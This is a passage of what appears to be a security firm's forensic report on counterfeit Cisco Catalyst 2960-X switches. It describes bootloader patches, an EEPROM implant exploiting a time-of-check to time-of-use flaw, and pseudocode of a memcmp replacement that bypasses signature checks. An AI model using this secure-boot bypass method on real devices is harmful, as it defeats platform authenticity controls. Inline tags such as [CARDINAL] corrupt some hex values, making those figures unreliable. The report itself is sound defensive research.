[PERSON] Elnec software [PERSON] PG4UW . Content inspection showed the chips were written with bytes swapped with [QUANTITY] 16 - bit words , thus requiring a quick adjustment to accommodate for that . Figure [CARDINAL] 12 . Evident byte swapping in the extracted content . The text was intelligible but required a certain mental strain to understand it . Figure [CARDINAL] 13 . TSOP56 adapter used . ( Image taken from the official [PERSON] Elnec web site)Three images were obtained , each [CARDINAL] 128 MB in size . After content extraction , the [PRODUCT] Flash chips were installed back on the boards to return them to an operable state.F-Secure.com | \u00a9 F - Secure LABS15PUBLIC2.7 [PERSON] Flash content analysisThe main purpose behind this step was to gather intelligence on how data was stored on the physical medium , and whether there was anything not accounted for during the live system analysis step performed before , such as bootloader code , any signatures , etc . A quick content inspection using the entropy graphing feature of the binwalk tool showed us several areas of interest . \u2022 The high - entropy area of [CARDINAL] about [CARDINAL] 20 M bytes was probably the main software image , fitting the size and theentropy level as compressed data has high entropy\u2022 What followed were [CARDINAL] two areas of distinct entropy footprints , likely some sort of uncompressed data\u2022 The [CARDINAL] zero - entropy area is where the same 0xFF value was written and can be considered [PERSON] empty\u2022 At the very end , there were several small but distinct blocks of dataAfter manual inspection at the very beginning of the image and direct binary comparison , we concluded that no bootloader code of any kind was placed there ; the data looked more like a file system . Supporting that assumption was the difference in the composition of the blocks on the devices . Therefore , it made more sense to assume bootloader code was located at the end of the Flash ; this was supported by the similar - looking entropy graph for all images towards the end . Figure [CARDINAL] 14 . [GPE] Zoomed view showing the very end of the image . The picture was very similar for all [CARDINAL] three Flash images . Indeed , inspecting the last megabyte revealed the presence of what appeared to be [CARDINAL] two bootloader programs , easily identified with the help of embedded strings ( examples from [FAC] Counterfeit [FAC] A):C2960X [FAC] Boot [FAC] Loader ( C2960X - BROM ) Version 15.2(2r)E1 , RELEASE SOFTWARE ( fc1 ) Compiled We d 23 - Apr-14 02:21 by [PERSON] abhakatandC2960X [PERSON] Boot [PERSON] Loader ( C2960X - HBOOT - M ) Version 15.2(2r)E1 , RELEASE SOFTWARE ( fc1 ) Compiled We d 23 - Apr-14 02:21 by abhakatThese boot loaders corresponded to the last [CARDINAL] two peaks on the entropy graph above.F-Secure.com | \u00a9 F - Secure LABS16PUBLICFigure [CARDINAL] 15 . Entropy graph of the known - good Flash image obtained from the [ORG] Genuine unit . Figure [CARDINAL] 16 . Entropy graph of the suspect Flash image obtained from the Counterfeit A unit.F-Secure.com | \u00a9 F - Secure LABS17PUBLICThe next series of peaks of [CARDINAL] around [CARDINAL] 130 [CARDINAL] to [CARDINAL] 132 MB represent data that was hard to attribute to anything that was known , but the best guess was that it was related to the [PRODUCT] Flash file systems . However , [CARDINAL] one interesting piece of information at the very end stood out ; it was marked with the magic string [ORG] AMCC and contained what appeared to be file names such as ppc.bin.key and pka_fw.bin . The analysis of this file format is summarised in appendix 6.3.The peak around [CARDINAL] 127 MB belonged to the microcode binary named c2960x_dlpd_porter.bin . This file was located on the ucode0 filesystem . Finally , [CARDINAL] two small peaks represented the lic0 and lic1 filesystems . The following table summarizes the investigation of the last few megabytes of the [PRODUCT] Flash contents of the [ORG] Counterfeit [ORG] A unit . Offset0x76A00000x77200000x78C00000x7DA08000x7DC00000x7EE00000x7FDD8000x7FDDC000x7FDFFFC0x7FE00000x7FFDC000x7FFF0000x7FFFFFCContentsThe lic1 filesystemThe lic0 filesystemThe ucode0 filesystemBlock of data marked [ORG] AMCCBoard configuration ( text [PERSON] based)C2960X [PERSON] Boot [PERSON] Loader ( C2960X - HBOOT - M)Inventory dataSignature [CARDINAL] 14 bytes , [CARDINAL] 55 AA AA [CARDINAL] 55C2960X [PERSON] Boot [PERSON] Loader ( C2960X - BROM)Signature [CARDINAL] 2Unknown ; appears to be PowerPC code but no text strings to identify it4 bytes , [CARDINAL] 4B FF F0 02 ( decodes as the ba 0xfffff000 PowerPC instruction)It can also be assumed the main flash filesystem started right at offset [CARDINAL] zero . While offsets of the [ORDINAL] first [CARDINAL] three entries differed on other units , the overall composition was expected to be the same . With some general understanding of what was where in the Flash , it was then possible to perform a meaningful comparison of [PRODUCT] Flash contents between the genuine unit and the counterfeit one , which was not upgraded . Looking at the very end of the file , some differences stood out . Both counterfeit units had offsets [CARDINAL] 0x7FFF800 [CARDINAL] 0x7FFFFFC [CARDINAL] and [CARDINAL] 0x7FFE000 0x7FFF000 filled with apparently random noise . Given that Flash chips in the erased state had all bits set , it was unlikely this was uninitialized data.F-Secure.com | \u00a9 F - Secure LABS18PUBLICFigure 17 . Differences at the very end between [LOC] the [LOC] Counterfeit [LOC] A and [PERSON] Genuine units . While the last [CARDINAL] four bytes were the same , the counterfeit unit had some extra bits and pieces , unlike the erased genuine bits . Unfortunately , further comparison was thwarted by the difference in versions of installed software and bootloaders . It was necessary to locate intact copies of the bootloader code in order to perform any kind of meaningful differential analysis.F-Secure.com | \u00a9 F - Secure LABS19PUBLIC2.8 [PERSON] Bootloader analysisFurther analysis required obtaining software images of corresponding versions from the official sources . However , [ORDINAL] first the software versions needed to be identified . This could be done via the file name of the installed application image . Furthermore , the following bootloader image versions were present on the counterfeit units at hand:\u2022 [WORK_OF_ART] Counterfeit [WORK_OF_ART] A ( operational):C2960X [WORK_OF_ART] Boot [WORK_OF_ART] Loader ( C2960X - HBOOT - M ) Version 15.2(2r)E1 , RELEASE SOFTWARE ( fc1 ) Compiled We d 23 - Apr-14 02:21 by abhakat C2960X Boot Loader ( C2960X - BROM ) Version 15.2(2r)E1 , RELEASE SOFTWARE ( fc1 ) Compiled We d 23 - Apr-14 02:21 by abhakat\u2022 Counterfeit B ( inoperable):C2960X Boot Loader ( C2960X - HBOOT - M ) Version [CARDINAL] 15.2(4r)E3 , RELEASE SOFTWARE ( fc4 ) Compiled We d 04 - Apr-18 10:35 by smaddasa C2960X Boot Loader ( C2960X - BROM ) Version [CARDINAL] 15.2(2r)E2 , RELEASE SOFTWARE ( fc1 ) Compiled Fri 05 - Dec-14 01:35 by abhakatThe version strings appeared unique enough to allow a search for them within the uncompressed data sections of the images at hand ; see appendix [CARDINAL] 6.2 regarding the file format of the software image . In fact , they were included as [CARDINAL] one monolithic image , likely directly copied to Flash in parts , starting from offset [CARDINAL] 0x7EE0000 , taking care to preserve inventory data . [PERSON] Bootloader images extracted from genuine software updates could then be directly compared with their counterparts obtained from [ORG] Flash content extracted directly from the units . The c2960x-universalk9-mz.150-2.EX5.bin software image obtained from [FAC] Counterfeit [FAC] A did not contain embedded bootloaders , so a search was conducted by grabbing multiple official images and matching version numbers found in there . The c2960x-universalk9-mz.152-2.E.bin image provided the correct versions . Checking the bootloader images obtained from [ORG] Counterfeit A:\u2022 [CARDINAL] Two changes were made to HBOOT : the [ORDINAL] first one to [CARDINAL] 8 bytes inside the code section , and the [ORDINAL] second whichwas considerably larger , appearing appended to the HBOOT image\u2022 Signature [CARDINAL] 1 data was intact\u2022 [CARDINAL] 12 bytes modified right before the BROM code\u2022 BROM code was intact\u2022 Signature [CARDINAL] 2 data was different\u2022 [ORG] Extra data is present around the code block at [CARDINAL] 0x7FFF000 , as highlighted beforeAt this point , the process in place for verification of each software piece was not known . However , it was evident that some tampering with HBOOT had taken place . To understand these modifications and their significance within the context of the system , it is important to consider what was known about [PRODUCT] the System - on - Chip and the way it booted up . The collected reference data is summarized in appendix 6.1.F-Secure.com | \u00a9 F - Secure LABS20PUBLICAssuming the PowerPC core started executing at [CARDINAL] 0xFFFFFFFC , the Flash ROM could be safely placed at the upper addresses so that the last 4 bytes in [PERSON] Flash , where we assumed the unconditional branch instruction was , map starting at [CARDINAL] 0xFFFFFFFC.After loading the last [QUANTITY] 1 [QUANTITY] megabyte or so of Flash into [PERSON] IDA [PERSON] Pro in the manner described above , we could start exploring the code . The assumption made above regarding Flash mapping is validated by the fact that IDA Pro could explore the code and create references automatically . The branch instruction at [CARDINAL] 0xFFFFFFFC transferred control to the small blob of PowerPC instructions at 0xFFFFF000 . This piece of code appeared to perform some basic initialization activities and passed control further to BROM.Judging by the contents of text strings included , BROM appeared to authenticate and start HBOOT and provided a rudimentary set of commands to rescue the system from the state where HBOOT could be started . While we were not as interested in the details of the command system , the image authentication functionality was important to understand . This functionality could be located easily by finding references to the tell - tale string Image passed digital signature verification that was being printed on the serial console when image authentication succeeded . The function referencing this string together with the companion failure message took [CARDINAL] 6 parameters , most important of which were the base address of HBOOT and the signature [CARDINAL] 1 address . This meant signature [CARDINAL] 1 was in fact the HBOOT signature . By repeating the search and analysis on the HBOOT image , a similar function was identified that was used for the same purpose of image authentication . This function was used to authenticate the application software image ; the process also showed up in console output . However , another use of the same function was made to authenticate BROM code when it was being copied over to the Flash memory . Careful inspection of the parameters being passed revealed that the BROM signature was located [CARDINAL] 0x2400 bytes before the image end , which was exactly where signature [CARDINAL] 2 was located . We could therefore conclude that signature [CARDINAL] 2 authenticated BROM code . Further inspection of the signature verification implementation in both BROM and HBOOT showed the use of some functions related to \" [ORG] SlimPro \" , as evident by corresponding error messages referenced by those functions : WR : Timeout waiting for [ORG] SlimPro response RD : Timeout waiting for SLimPro msg RD : Timeout waiting for SLimPro responseThe answer to the question of what this component might be came from various materials published by the vendor . The SLIMpro was a separate computing unit integrated into [FAC] the System - on - Chip and was responsible for system - related security operations . The strings presented above confirmed this information . Further information on the SoC can be found in appendix 6.1.With a clear overview of what was verified , when , and how , a prominent question arose : how did BROM report successful verification of the modified HBOOT code ? Answering this required a review of what was already known , and a deeper dive into the modifications performed on the hardware of the [ORG] Counterfeit [ORG] A unit . But [ORDINAL] first , the changes done to HBOOT and their purpose were investigated.F-Secure.com | \u00a9 F - Secure LABS21PUBLIC2.9 HBOOT patch analysisThe analysis required a good understanding of what HBOOT did and how . We began by observing that like BROM , HBOOT implemented a console with an impressive set of commands . Finding out how these commands were added allowed us to spot every implemented command , and rename the corresponding handler functions . This provided at least some insight into what parts were patched . Figure [CARDINAL] 18 . List of console commands supported by HBOOT.Starting with the [ORDINAL] first modification of [CARDINAL] two PowerPC instructions in the middle of the HBOOT code section , we saw the boot command implementation was modified to include a call to the other added code fragment . The call was patched in to be performed after the application image was loaded into memory and authenticated . Analysis of the inserted code revealed this to be the [ORDINAL] first stage of a de - obfuscator ( XOR - based with the key derived from the unit serial number ) , processing the \" random \" data previously discovered at the end of Flash . This data is de - obfuscated into a stack - based buffer , and control was then passed there . Care was taken to verify the operation was performed correctly , so the unit did not crash even when there was no obfuscated data present . That code was found to be a stage 2 de - obfuscator , with the key based on certain data from the Flash IC not accessible directly through conventional tools we had . Due to these circumstances , the key had to be brute forced . Similarly , the de - obfuscated code of stage [CARDINAL] 3 was again placed into a stack - based buffer and executed.F-Secure.com | \u00a9 F - Secure LABS22PUBLICStage 3 was found to be the actual patching code , searching for the serialNu string and applying some modifications to the [ORG] IOS image expected to be already loaded in memory . The modifications were few and consisted of mainly \" return OK \" kind of patches ; full details of functions being patched will not be published for obvious reasons . However , it appeared the only purpose of this \" added functionality \" was to circumvent software licensing protections . It was due to this added patching functionality that the counterfeit units could bypass platform authenticity verification . This also explained why units stopped working after a software update : the latest software will almost certainly rewrite the patched HBOOT code , removing the work done to bypass the checks . The case of the [ORG] Counterfeit B unit confirmed this hypothesis . When the CISO of the victim company provided us the counterfeit devices for investigation one of the main tasks was to answer whether there were any backdoor - like functionalities being introduced . We concluded this did not appear to be the case for application and HBOOT code.F-Secure.com | \u00a9 F - Secure LABS23PUBLIC2.10 SLIMpro analysisWe had reached the point where we were ready to investigate the question posed previously with regards to the bypassing of HBOOT image verification . As the SLIMpro component was responsible for authentication because PowerPC cores only initiated the process by posting a message to a \" mailbox \" , it was reasonable to conclude that some changes were implemented , resulting in this component always reporting a successful authentication . By identifying and understanding these changes we would be able to explain how the counterfeiters are able to bypass the code authentication function . What piqued our interest in the case of [WORK_OF_ART] Counterfeit [WORK_OF_ART] A was the \" implant \" added in conjunction with a serial EEPROM chip . What was the reason for such an unusual and obvious addition ? Furthermore , the same chip had been replaced with a completely different package in [GPE] Counterfeit [DATE] B.Figure [DATE] 19 . The implant PCB , disconnected from the unit , with the resin blob removed . As with Counterfeit B , the top marking was erased . Since the protocol used to interface with EEPROM was relatively simple and slow , it was easy to intercept and record the communications to gain insight into the workings of this implant . Any existing tool able to decode I2C communications and export the decoded traffic could be used for this purpose . Below is a short excerpt of this intercepted traffic as produced by the [LAW] Logic software shipped with Saleae logic analyzer : Time [ s],Packet ID , Address , Data , Read / Write , [ORG] ACK / NAK 3.256962416666667,0,'164 ' ( 0xA4),'0 ' ( 0x00),Write , [ORG] ACK 3.257046583333334,0,'164 ' ( 0xA4),'0 ' ( 0x00),Write , [ORG] ACK 3.257230166666667,1,'164 ' ( 0xA4),'240 ' ( 0xF0),Read , [ORG] ACK 3.257315166666667,1,'164 ' ( 0xA4),'240 ' ( [CARDINAL] 0xF0),Read , [ORG] ACK 3.257400333333333,1,'164 ' ( 0xA4),'3 ' ( 0x03),Read , ACK 3.257485416666666,1,'164 ' ( 0xA4),'18 ' ( [DATE] 0x12),Read , [ORG] ACK 3.257570500000000,1,'164 ' ( 0xA4),'0 ' ( 0x00),Read , ACK 3.257655583333333,1,'164 ' ( 0xA4),'252 ' ( 0xFC),Read , [ORG] ACK According to the [GPE] M24512 data sheet , random - access read operation was performed by writing [CARDINAL] two address bytes followed by reading multiple bytes of data . This corresponded to the observed traffic . A simple script wasF-Secure.com | \u00a9 F - Secure LABS24PUBLICwritten to parse such output and to create a dump file containing the intercepted contents , as well as to provide some overview on the read transactions executed . Below is the output of the script showing what addresses were accessed and how many bytes read ( in hexadecimal ) , which is much easier to analyze compared to the raw transactions . It has been abbreviated due to its size . Start address : [CARDINAL] 0000 , byte count : 0020 Start address : 021E , byte count : [CARDINAL] 0004 Start address : [CARDINAL] 0020 , byte count : [CARDINAL] 0040 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : 00A0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 00E0 , byte count : [CARDINAL] 0040 Start address : 0120 , byte count : [CARDINAL] 0040 Start address : [DATE] 0160 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 6320 , byte count : [CARDINAL] 0400 [ [ORG] SEQUENTIAL [ORG] ACCESS [ORG] PATTERN CONTINUES ] Start address : [CARDINAL] 7320 , byte count : [CARDINAL] 0400 Start address : [DATE] 7720 , byte count : [CARDINAL] 0364 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : 00A0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 00E0 , byte count : [CARDINAL] 0040 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : 00A0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 00E0 , byte count : [CARDINAL] 0040 Start address : 0120 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 61A0 , byte count : 0100 Start address : [CARDINAL] 6020 , byte count : 0100 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : 00A0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 00E0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 6020 , byte count : 0100 Start address : [DATE] 0060 , byte count : [CARDINAL] 0040 Start address : 00A0 , byte count : [CARDINAL] 0040 Start address : [CARDINAL] 5EA0 , byte count : 0100 Start address : [CARDINAL] 0220 , byte count : [CARDINAL] 0200 [ [ORG] SEQUENTIAL [ORG] ACCESS [ORG] PATTERN CONTINUES ] Start address : 5E20 , byte count : 0050 Start address : [CARDINAL] 0220 , byte count : [CARDINAL] 0400 [ [ORG] SEQUENTIAL [ORG] ACCESS [ORG] PATTERN CONTINUES ] Start address : 5E20 , byte count : [CARDINAL] 0050Exactly the same behavior was observed when traffic was captured on the [ORG] Genuine unit . The following could be immediately noted:\u2022 Repeating small accesses to addresses [CARDINAL] 0x60 through [CARDINAL] 0xE0 of [CARDINAL] 0x40 bytes each , followed by a significantsequential read.\u2022 Data starting at address [CARDINAL] 0x220 was read twice , but with different transaction sizes.F-Secure.com | \u00a9 F - Secure LABS25PUBLICHere is a closer look at what was being read : Figure [CARDINAL] 20 . The beginning of the obtained EEPROM / implant dump of the [ORG] Counterfeit [ORG] A unit . After a 32 - byte block of unknown data , we could see the [ORG] AMCC magic bytes , identifying the container format described in appendix [CARDINAL] 6.3 . By correlating the accesses with file offsets within the container , it was easy to identify which files from this container were being read and in what order , so a higher - level overview could be pieced together:\u2022 pka_fw.bin \u2022 ipp.bin.ksg \u2022 ipp.bin.key \u2022 ipp.bin.sig \u2022 ipp.bin \u2022 ipp.bin ( again)The fact that the ipp.bin file was being read twice stands out . This mirrored the situation with the main application binary being read twice ; [ORDINAL] first to verify the signature , then to decompress and pass control to . Therefore , it is easy to assume the similar situation here as well : verify , then execute . Such an implementation , however , is vulnerable to a classic race condition called time - of - check to time - of - use ( TOCTOU ) where verified content could be manipulated after it had been verified but before its use . This immediately prompted a comparison between the [CARDINAL] two reads ( it was easy to truncate the I2C traffic dump to exclude the [ORDINAL] second series of transactions starting at address 0x220).Quite similarly to the HBOOT patch , [CARDINAL] two differences were detected : [CARDINAL] one small patch within the bulk of the file and another , larger binary blob appended to the image . Assuming this file contained software for some CPU architecture and not data , we could attempt to identify which architecture this was meant to be executed on . Unfortunately , binwalk -A did not produce any meaningful output . However , the following facts were observed:\u2022 The beginning of the file appeared to contain a set of 32 - bit little - endian integers similar in magnitude exceptthe very [ORDINAL] first one\u2022 The byte sequence [DATE] 70 [DATE] 47 was encountered quite often in the fileThese [CARDINAL] two facts point at the possibility of this being ARM [PERSON] Thumb code , with the exception vectors located at the beginning as is common with ARM - based embedded systems . From there , it was easy to verify the assumption and guess the correct loading address with [ORG] IDA [ORG] Pro . It was also possible to locate the previously observed BOOT [CARDINAL] FAIL string in this file.F-Secure.com | \u00a9 F - Secure LABS26PUBLICWith that , we concluded that the ipp.bin file contained software running on the SLIMpro SoC component . After loading the image in [ORG] IDA [ORG] Pro and spending some time marking up known library functions , we turned our attention to the changes made to the image by the implant . It transpired that a call to memcmp ( ) was replaced in a certain function with a call to another function introduced by the patch ; the new function inherited the original semantics . Below is the pseudocode of the replacement function : int _ _ fastcall ADDED_sub_xxxx(const void * a1 , const void * a2 , unsigned int a3 ) { signed int i ; // r3 int result ; // r0 // Check the conditions if ( ( MEMORY[0x50000088 ] ^ MEMORY[0x5000008C ] ) = = ( [CARDINAL] MEMORY[0x2FFFFFF0 ] ^ MEMORY[0x2FFFFFF4 ] ) || * a2 = = [ORG] 0x27 & & [ORG] * ( a2 + 1 ) = = 0x4F ) // Compare the bytes for ( i = [CARDINAL] 0 ; i < n & & * ( a1 + i ) = = * ( a2 + i ) ; + + i ) ; // Report the result if ( i = = n ) } Not having access to the SoC reference manual or other sources of information concerning the SoC memory map as seen by SLIMpro , made it very challenging to understand what the [ORDINAL] first condition meant . The [ORDINAL] second condition took into account the contents of [CARDINAL] one of the input buffers : it should have started with bytes [CARDINAL] 27 4F. In both cases , the number of bytes to be compared was reset to [CARDINAL] two . Considering the goal of the whole effort was to bypass signature verification checks , a reasonable guess was that this function made that possible in some cases . On inspecting signatures present in the extracted Flash images , we found the following BROM signature ( after [ORG] RSA decryption):Figure [CARDINAL] 21 . Decrypted BROM signature . An immediate conclusion was that the [ORDINAL] second condition was used to circumvent the BROM signature check , while we could only assume that the [ORDINAL] first condition was somehow involved in circumventing HBOOT signature check.F-Secure.com | \u00a9 F - Secure LABS27PUBLICThe same exercise could be repeated against [PERSON] Counterfeit [PERSON] B. The integrated circuit installed on the processor board appeared to have the same pinout as the one found on the implant PCB on [PERSON] Counterfeit [PERSON] A. This was performed by tapping the correct vias on the board , given connecting to the pads of the [ORG] QFN package footprint was not feasible . Here is the list of transactions performed on the bus for this unit . Start address : [CARDINAL] 0000 , byte count : 0020 Start address : [CARDINAL] 0020 , byte count : 0100 Start address : 0120 , byte count : [CARDINAL] 0400 Start address : 0520 , byte count : [CARDINAL] 0400 Start address : 0920 , byte count : [CARDINAL] 0400 Start address : 0D20 , byte count : [CARDINAL] 0400 Start address : [DATE] 1120 , byte count : [CARDINAL] 0400 Start address : [DATE] 1520 , byte count : [CARDINAL] 0400 Start address : [DATE] 1920 , byte count : [CARDINAL] 0400 Start address : [GPE] 1D20 , byte count : [CARDINAL] 0400 Start address : [DATE] 2120 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 2520 , byte count : [CARDINAL] 0400 Start address : [DATE] 2920 , byte count : [CARDINAL] 0400 Start address : 2D20 , byte count : [CARDINAL] 0400 Start address : [DATE] 3120 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 3520 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 3920 , byte count : [CARDINAL] 0400 Start address : 3D20 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 4120 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 4520 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 4920 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 4D20 , byte count : [CARDINAL] 0400 Start address : [DATE] 5120 , byte count : [CARDINAL] 0400 Start address : [CARDINAL] 5520 , byte count : [CARDINAL] 0400 Start address : [DATE] 5920 , byte count : [CARDINAL] 0400 Start address : 5D20 , byte count : 0250The differences were obvious : apart from [CARDINAL] two shorter reads at the beginning , the whole content was read in [CARDINAL] one go , with no per - file read patterns as observed in [PERSON] Counterfeit [PERSON] A. [PERSON] Further inspection of the dumped data revealed pseudo - random data with no discernible structure , apart from the [ORDINAL] first 0x120 bytes . The 32 - byte header contained the same data ; however , the [ORG] AMCC file structure was not found . Instead , it appeared the software image starts as is . We could only conclude that the contents were encrypted in some way , and that no further analysis was possible . Figure [CARDINAL] 22 . The beginning of the obtained EEPROM / implant dump of [GPE] Counterfeit B.F-Secure.com | \u00a9 F - Secure LABS28PUBLICGiven that , there was an answer to the last question concerning the operation of [WORK_OF_ART] Counterfeit [WORK_OF_ART] A : [WORK_OF_ART] a [WORK_OF_ART] TOCTOU vulnerability affecting SLIMpro ROM code was exploited in the wild to bypass software signature checks against the SLIMpro secure processing unit . By extension , the issue affects the [ORG] Genuine unit as well . While [CARDINAL] one previously published report6 regarding issues in the [ORG] Cisco [ORG] Catalyst secure boot process was accessible , at the time of writing this paper , no public information was available detailing this or similar issues affecting the [ORG] Catalyst 2960- X series . This led us to believe this was indeed a previously unknown vulnerability . It is important to note that the comparison of EEPROM data extracted from the [GPE] Genuine unit and unpatched data extracted from [ORG] Counterfeit [ORG] A showed them to be identical . As the patches were designed to bypass signature checks only , we could conclude there was no \" backdoor \" code introduced into the SLIMpro environment.6 url | \u00a9 F - Secure [CARDINAL] LABS29PUBLIC3 CONCLUSIONSThe problem of counterfeiting is wide and raises a number of concerns . Not only does it mean a loss of trust in the brand , and loss of revenue for the company whose products get copied , but counterfeit devices also pose a security risk to the victim companies . The [CARDINAL] two counterfeit devices provided to us for this research were detected after a software upgrade resulted in a failure . These units were assessed from both software and hardware perspectives to investigate whether the victim company \u2019s networks had been compromised via introducing \" backdoor access \u201d , and to understand how and why counterfeit devices bypassed the platform \u2019s authentication security control . Both units reached their goal of circumventing the implemented platform authentication checks with similar means on the software level by relying on patching the loaded and authenticated application image before control was passed over to the application . The functionality implementing the patches was wrapped into multiple layers of obfuscation . However , these authentication bypasses were performed on each boot and thus were not persistent . No further functionality was identified on the software level that could be considered as backdoors \u2013 both in PowerPC and SLIMpro code . This conclusion was supported by the fact that genuine software was patched on- the - fly and the patches only served to circumvent authenticity checks . On the hardware level , the [CARDINAL] two units took quite different approaches as to circumventing boot - time software authentication . Counterfeit A contained \" add - on \" circuitry which exploited a race condition in the SLIMpro ROM code to bypass SLIMpro software verification . It did this by intercepting EEPROM control signals , replacing certain bytes in the image being loaded to modify software behavior . It appears the processor PCB in this unit was not modified . While Counterfeit A only received a post - manufacturing add - on circuitry , the PCB design of [GPE] Counterfeit B was changed to incorporate the modification of [ORG] Counterfeit [ORG] A and replaced the [ORG] EEPROM completely with an unknown integrated circuit . This signified a considerable resource investment in design , manufacture , and testing of such forged products compared to the more low - cost ad - hoc approach used in [PERSON] Counterfeit [PERSON] A. The board layout and silkscreen similarities also suggested that the people behind this forgery might have either had access to [GPE] Cisco proprietary engineering documentation such as PCB design files in order to be able to modify them , or they invested heavily in the complicated process of replicating the original board design files based solely on genuine boards.F-Secure.com | \u00a9 F - Secure LABS30PUBLIC4 ABOUT [ORG] THE [ORG] AUTHORDmitry [ORG] Janushkevich began his career as a testing- and later embedded - software engineer working on the development of leading - edge solid - state drive technologies . Together with a bachelor 's degree in computer systems design , this has given him a strong background in embedded systems design and development for future explorations in their security . After joining F - [ORG] Secure [ORG] Consulting and gaining experience in customer - facing consultancy , embedded systems security became his primary focus . Currently a senior consultant , he has a strong track record in providing security - related consulting for automotive , aerospace , and consumer electronics industries.5 [PRODUCT] ABOUT F - SECURE [PRODUCT] HARDWARE [PRODUCT] SECURITY TEAMF - Secure Consulting \u2019s Hardware Security team provides information security consulting to the most unique , challenging and critical industries in the world . It delivers industry - leading services to secure hardware , safety- critical embedded systems , software applications and IT infrastructure . It also provides detailed and comprehensible security analysis of software and hardware systems , along with practical and effective mitigation and protection strategies . With a vast breadth of experience in hardware and software design and engineering , it \u2019s trusted by companies across the globe to assess and test their products and processes . Its work safeguards products from malicious compromise , and in doing so protects the safety of passengers , ensures the resilience of critical infrastructure , and secures company trade secrets and intellectual property.F-Secure.com | \u00a9 F - Secure LABS31PUBLIC6 APPENDICES6.1 The SoCThis appendix details what little information was publicly available on the main System - on - Chip ( SoC ) in charge of the device , paying special attention to any security features . Figure [CARDINAL] 23 . U1 , the main SoC in situ in [GPE] Counterfeit [GPE] A. A couple of crystals and a backup [ORG] Lithum battery can be seen around . The main [PERSON] SoC was marked as [ORG] APM86392 - CNE600T7 made by [ORG] Applied [ORG] Micro [ORG] Corp ( now [PERSON] MACOM ) . The manufacturer describes the system as based around [ORG] the Dual - Core [ORG] Power \u2122 465 processor . No mention of features related to code authentication during boot could be found on the manufacturer 's website . However , some details can be gleaned via announcements8 in the media9.7 url [CARDINAL] 8 url [CARDINAL] 9 url | \u00a9 F - Secure LABS32PUBLICFigure 24 . Block diagram of [ORG] APM86392 . Image taken from linuxdevices.org . Any units relating to security were of particular interest ; sometimes these units were not labelled as such but were given cryptic or trademarked names . [CARDINAL] Two such units stick out : \" Security Engine \" and \" SLIMpro \" . [LAW] The \" [LAW] Security [LAW] Engine \" was quite likely to be the one mentioned by the manufacturer as \" security subsystem ( optional ) with acceleration for [ORG] IPSec , [ORG] SSL / TLS , SRTP / SRTCP , [PERSON] Kasumi , and public - key protocols ( [ORG] PKA ) \" on the product page . However , what is SLIMpro?The same media source describing10 a previous generation of the same [PRODUCT] SoC cites the manufacturer : \" \u2026 AppliedMicro also added its [ORG] Scalable [ORG] Lightweight [ORG] Intelligent [ORG] Management [ORG] Processor ( [ORG] SlimPro ) coprocessor , which provides advanced power management , security , and concurrency features \u2026 \" while also mentioning [PERSON] Secure [PERSON] Boot and namedropping \" [ORG] SlimPro [ORG] Trusted [ORG] Management Module \" which appeared to be relevant to this research . Searching for \" AppliedMicro Trusted Management Module \" yielded a very interesting \u2013 and apparently public \u2013 presentation11 documenting exactly that unit . We strongly recommended the reader to read through the whole presentation , but here we note that the SLIMpro unit indeed represented the security epicentre of the whole SoC.10 url [CARDINAL] 11 url | \u00a9 F - Secure LABS33PUBLICSpeculatively , and in accordance with what the presentation tried to show , the [ORG] SLIMpro unit booted [ORDINAL] first and was responsible for authenticating and starting any code on the PowerPC cores , apart from overall system configuration tasks . This speculation was easy to verify by swapping [PRODUCT] NOR [PRODUCT] Flash chips between a counterfeit unit and the genuine one . The genuine unit stopped booting completely , and the message displayed over the serial console was : BOOT FAILThe counterfeit unit , on the other hand , proceeded to start the bootloaders as expected.6.1.1 THE BOOT PROCESSThere should be enough information \u2013 with some guesswork \u2013 to piece together the overall boot process from the security standpoint , considering all known processing cores that participated.1 . SLIMpro start upa ) SLIMpro was expected to perform authentication of Flash contents b ) SLIMpro started ( one ? ) [ORG] PPC core , setting PC to [CARDINAL] 0xFFFFFFFC ( most common configuration)2 . PPC core ran PBL code at Flash offset 0x7FFF000 ( previously unidentified ) [CARDINAL] 3 . [ORG] PPC core ran BROM code ( by correlating console messages with BROM contents)a ) BROM authenticated [PERSON] HBOOT code4 . [ORG] PPC core ran HBOOT code ( by correlating console messages with HBOOT contents)a ) HBOOT authenticated application code5 . [ORG] PPC core ran application codea ) Application code authenticated the platform b ) Depending on the result , the unit became [ORG] inoperableF-Secure.com | \u00a9 F - Secure LABS34PUBLIC6.2 The [ORG] MZIP file formatCisco delivers software updates for [ORG] Catalyst devices as a single binary file . This meant updates for all system components were carried in this file , whether application software , bootloaders , or microcode . This warranted a closer look into the format of this file . The file format was identified with the [ORDINAL] first [CARDINAL] four bytes being \" MZIP \" and was referred to as such . Apparently , this was a \" [ORG] Cisco [ORG] IOS [ORG] MZIP compressed image \" as noted on some sources on the Internet . No specifications were publicly available . Some existing tools12 were found which served as a starting point for researching the format , however no tool was found which would handle unpacking of the images at hand . Naturally , the code that was responsible for loading [ORG] MZIP files should serve as the best reference , so the already obtained genuine bootloader images could be used for that purpose . Quite a lot of references to [ORG] MZIP were found in the HBOOT image , so the relevant parts were reverse engineered . On a very high level , the file format was very similar to what would be found in executable file formats \u2013 this could easily be seen from what mziptools was intended to output : some fixed header data including an entry point address as well as a collection of segments . This meant the file was simply a program image which was loaded and executed by the bootloader chain . Segments could also be optionally compressed with PKZIP or BZIP2 . Judging by the presence of the usual BZh91AY signature , data in our files was indeed compressed with [ORG] BZIP2 . As data is [ORG] BZIP2 compressed , it was possible to apply usual tools such as 